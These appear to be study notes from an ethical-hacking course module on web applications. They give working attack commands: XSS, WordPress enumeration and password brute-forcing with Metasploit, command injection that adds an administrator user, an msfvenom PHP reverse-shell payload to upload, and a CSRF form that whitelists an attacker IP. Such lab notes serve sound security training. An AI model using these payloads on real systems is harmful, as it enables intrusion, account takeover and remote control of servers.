# Module 14 - Hacking Web Applications #

## Exploiting Parameter Tampering and XSS Vulnerabilities in Web Applications ##
Changing URL parameters to obtain users information. Adding ``` <script>You've been Hacked</script> ``` to a field that reflects information.

- - - -

## Enumerating and Hacking a Web Application ##

### WPScan ###
``` wpscan --url <URL> --enumerate u ``` - Enumerates WordPress information.

### Metasploit ###
``` msfconsole ```

1. ``` use auxiliary/scanner/http/wordpress_login_enum ```
2. ``` show options ```, ``` set PASS_FILE <Path to the Password Wordlist File> ```, ``` set RHOSTS <Target IP> ```, ``` set RPORT <Target Website Port> ```, ``` set TARGETURI <Target URL> ```, ``` set USERNAME <Username to Crack the Password - Ex. admin> ```
3. ``` exploit ```

Try the credentials in ``` <URL>/wp-login.php ```.


- - - -

## Exploiting Remote Command Execution Vulnerability to Compromise a Target Web Server ##
Dvwa:

``` ping 10.10.10.10 | net user test /add ``` - To add a user 
``` | net localgroup Administrators test /add ``` - Add the user to the Administrators group


- - - -

## Auditing Web Application Framework ##

### Vega ###
Scan > Start New Scan > Enter a Base URI for Scan


- - - -

## Website Vulnerability Scanning ##

### Acunetix WVS ###
1. Add Target
2. General > Business Criticality: High
3. Scan > Select the Scan Type, Report and Schedule


- - - -

## Exploiting File Upload at Different Security Levels ##
``` msfvenom -p php/meterpreter/reverse_tcp lhost=<Attacker IP> lport=<Attacker Listener Port> -f raw ``` - Generating the payload. Copy it to a .php file and upload it to the vulnerable functionality. 

Set up the listener. To execute the payload, navigate to the uploaded file in the browser.


- - - -

## Performing Cross-Site Request Forgery (CSRF) Attack ##
CSRF in a Wordpress site.

### WPScan ###
``` wpscan -u <URL> --enumerate vp ``` - To enumerate vulnerable plugins. The plugin _Wordpress Firewall 2_ is vulnerable to CSRF.

Create the _HTML_ file:
```
  <form method="POST" action="<URL>/wp-admin/options-general.php?page=wordpress-firewall-2%2Fwordpress-firewall-2.php">
    <script>alert("As an Admin, To enable additional security to your Website. Click Submit")</script>
    <input type="hidden" name="whitelisted_ip[]" value="<Attacker IP>" >
    <input type="hidden" name="set_whitelist_ip" value="Set Whitelisted IPs" class="button-secondary" >
    <input type="submit" >
  </form> 
```

Lure the victim to execute the script and click on 'Submit'. It will perform the actions in the script: whitelisting the attacker IP so that the firewall does not affect its requests.
